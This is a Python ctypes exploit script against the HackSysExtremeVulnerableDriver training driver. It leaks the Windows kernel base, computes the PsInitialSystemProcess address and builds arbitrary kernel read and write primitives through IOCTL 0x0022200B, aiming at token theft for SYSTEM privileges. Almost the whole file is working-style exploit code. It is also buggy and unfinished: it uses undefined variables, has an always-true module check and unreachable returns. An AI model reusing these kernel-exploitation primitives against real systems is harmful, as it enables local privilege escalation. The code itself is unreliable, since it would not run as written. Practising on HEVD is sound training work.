#!/usr/bin/python
# -*- coding: utf-8 -*-
import ctypes
import struct
import sys
import os
import time
import platform
from ctypes import *
from ctypes.wintypes import *
############################################ Windows Constants ##############################################

ntdll = windll.ntdll
kernel32 = windll.kernel32
gdi32 = windll.gdi32
user32 = windll.user32

GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 3
FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000
NULL = 0
STATUS_SUCCESS = 0
MOVEFILE_REPLACE_EXISTING = 0x01
CREATE_SUSPENDED = 0x00000004
THREADFUNC = CFUNCTYPE(None)
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x00000040
PAGE_READWRITE = 0x00000004
ThreadBasicInformation = 0

###################################################### DEFINITIONS ##########################################################
ntdll.NtAllocateVirtualMemory.argtypes = [
    c_ulonglong,
    POINTER(c_ulonglong),
    c_ulonglong,
    POINTER(c_ulonglong),
    c_ulonglong,
    c_ulonglong,
    ]
kernel32.WriteProcessMemory.argtypes = [c_ulonglong, c_ulonglong,
        c_char_p, c_ulonglong, POINTER(c_ulonglong)]
kernel32.DeviceIoControl.argtypes = [
    c_void_p,
    c_ulong,
    c_void_p,
    c_ulong,
    c_void_p,
    c_ulong,
    POINTER(c_ulong),
    c_void_p,
    ]

kernel32.ReadProcessMemory.argtypes = [c_void_p, c_void_p, c_void_p,
        c_size_t, POINTER(c_size_t)]
ntdll.NtQueryInformationThread.argtypes = [c_void_p, c_ulonglong,
        c_void_p, c_ulong, POINTER(c_ulonglong)]
STATUS_SUCCESS = 0
written = c_size_t()
read = c_size_t()

baseadd = c_ulonglong(0x000000001a000000)
addsize = c_ulonglong(0x3000)

dwStatus = ntdll.NtAllocateVirtualMemory(
    0xFFFFFFFFFFFFFFFF,
    byref(baseadd),
    0,
    byref(addsize),
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE,
    )

# If not zero (True), something didn't work.

if dwStatus != STATUS_SUCCESS:
    print ('Something went wrong while allocating memory', 'e')
    sys.exit()


########################################## KERNEL BASE ################################################
def getkernelBase(driver_handle, what=None, where=None):
    print '[*] Calling NtQuerySystemInformation w/SystemModuleInformation'
    sys_info = create_string_buffer(0)
    sys_info_len = c_ulong(0)

    ntdll.NtQuerySystemInformation(0xb, sys_info, len(sys_info),
                                   addressof(sys_info_len))

    sys_info = create_string_buffer(sys_info_len.value)
    result = ntdll.NtQuerySystemInformation(0xb, sys_info,
            len(sys_info), addressof(sys_info_len))

    if result == 0:
        print '[*] Success, allocated {}-byte result buffer'.format(str(len(sys_info)))
    else:

        print '[!] NtQuerySystemInformation failed with NTSTATUS: {}'.format(hex(result))

    class SYSTEM_MODULE_INFORMATION(Structure):

        _fields_ = [
            ('Reserved', c_void_p * 2),
            ('ImageBase', c_void_p),
            ('ImageSize', c_long),
            ('Flags', c_ulong),
            ('LoadOrderIndex', c_ushort),
            ('InitOrderIndex', c_ushort),
            ('LoadCount', c_ushort),
            ('ModuleNameOffset', c_ushort),
            ('ImageName', c_char * 256),
            ]

    handle_num = c_ulong(0)
    handle_num_str = create_string_buffer(sys_info.raw[:8])
    memmove(addressof(handle_num), handle_num_str, sizeof(handle_num))

    print '[*] Result buffer contains {} SystemModuleInformation objects'.format(str(handle_num.value))
    sys_info = create_string_buffer(sys_info.raw[8:])

    counter = 0
    for x in range(handle_num.value):
        tmp = SYSTEM_MODULE_INFORMATION()
        tmp_si = create_string_buffer(sys_info[counter:counter
                + sizeof(tmp)])
        memmove(addressof(tmp), tmp_si, sizeof(tmp))
        if 'ntoskrnl' or 'ntkrnl' in tmp.ImageName:
            img_name = tmp.ImageName.split('\\')[-0x01]
            print '[*] Kernel Type: {}'.format(img_name)
            kernel_base = hex(tmp.ImageBase)[:-0x01]
            print '[*] Kernel Base: {}'.format(kernel_base)
            
            return (img_name, kernel_base)
    counter += sizeof(tmp)

########################################### CALCULATE OFFSETS FROM KERNEL #############################################
def get_PsISP_kernel_address(kernel_base):     
    # Load kernel image in userland and get PsInitialSystemProcess offset
    kernel32.LoadLibraryA.restype = HMODULE #I have no fucking idea what HMODULE is
    hKernelImage = kernel32.LoadLibraryA(kernel_base)
    debug_print("[+] Loading %s in Userland" % kernel_base)
    debug_print("[+] %s Userland Base Address : 0x%X" % (kernel_base, hKernelImage))
    kernel32.GetProcAddress.restype = c_ulonglong
    kernel32.GetProcAddress.argtypes = (HMODULE, LPCSTR)
    PsISP_user_address = kernel32.GetProcAddress(hKernelImage,"PsInitialSystemProcess")
    debug_print("[+] PsInitialSystemProcess Userland Base Address: 0x%X" % PsISP_user_address)
    
    # Calculate PsInitialSystemProcess offset in kernel land
    system_kernel_base_pointer = kernel_image_base + ( PsISP_user_address - hKernelImage)
    debug_print("[+] PsInitialSystemProcess Kernel Base Address: 0x%X" % PsISP_kernel_address_ptr)
    
    PsISP_kernel_address = c_ulonglong()
    
    return system_kernel_base_pointer

################################################### WRITE ###########################################################
def writePrimitive(driver_handle, what=None, where=None):
    what_addr = 0x000000001a001000
    # Write the what value to what_addr
    data = struct.pack('<Q', what)
    dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF,
            what_addr, data, len(data), byref(written))
    
    if dwStatus == 0:
        print ('Something went wrong while writing to memory', 'e')
        sys.exit()
        
    data = struct.pack('<Q', what_addr) + struct.pack('<Q', where)
    dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF,
            0x000000001a000000, data, len(data), byref(written))
    
    if dwStatus == 0:
        print ('Something went wrong while writing to memory in the packing section'
               , 'e')
        sys.exit()
        
    IoControlCode = 0x0022200B
    InputBuffer = c_void_p(0x000000001a000000)
    InputBufferLength = 0x10
    OutputBuffer = c_void_p(0)
    OutputBufferLength = 0
    dwBytesReturned = c_ulong()
    lpBytesReturned = byref(dwBytesReturned)
    
    print 'Value before DeviceIoControl: %08x' \
        % cast(0x000000001a002000, POINTER(c_ulonglong))[0]
    
    triggerIOCTL = kernel32.DeviceIoControl(
        driver,
        IoControlCode,
        InputBuffer,
        InputBufferLength,
        OutputBuffer,
        OutputBufferLength,
        lpBytesReturned,
        NULL,
        )
    
    print 'Value after: %08x' % cast(0x000000001a002000,
            POINTER(c_ulonglong))[0]
    return triggerIOCTL
################################################### READ ###########################################################
def readPrimitive(driver_handle, system_kernel_base_pointer, where=None):

    #We've created a block of memory at the top of userland via dwStatus
    what_addr = system_kernel_base_pointer + 0x358 #some shit here system token address
    where = 0x000000001a001000

    IoControlCode = 0x0022200B
    InputBuffer = c_void_p(0x000000001a001000)
    InputBufferLength = 0x10
    OutputBuffer = c_void_p(0)
    OutputBufferLength = 0
    dwBytesReturned = c_ulong()
    lpBytesReturned = byref(dwBytesReturned)
    
    print 'Value before DeviceIoControl: %08x' \
        % cast(where, POINTER(c_ulonglong))[0]
    
    triggerIOCTL = kernel32.DeviceIoControl(
        driver,
        IoControlCode,
        InputBuffer,
        InputBufferLength,
        OutputBuffer,
        OutputBufferLength,
        lpBytesReturned,
        NULL,
        )
    
    print 'Value after: %08x' % cast(0x000000001a001000,
            POINTER(c_ulonglong))[0]
    read_value = cast(0x000000001a001000,
            POINTER(c_ulonglong))[0]
    return triggerIOCTL
    return read_value

########################################### MAIN ##############################################
def executeOverwrite():
    driver_handle = kernel32.CreateFileA(
        '\\\\.\\HackSysExtremeVulnerableDriver',
        GENERIC_READ | GENERIC_WRITE,
        0,
        None,
        3,
        0,
        None,
        )
    if not driver_handle or driver_handle == -0x01:
        print '[!] Driver handle not found :(\n'
        sys.exit()
    else:
        print '[X] Got handle to the driver.\n'

        img_name, kernel_base = getkernelBase(driver_handle)
        system_kernel_base_pointer = get_PsISP_kernel_address(kernel_base)
        read_value = readPrimitive(driver_handle, system_kernel_base_pointer)
############################################ RUN ################################################
executeOverwrite()
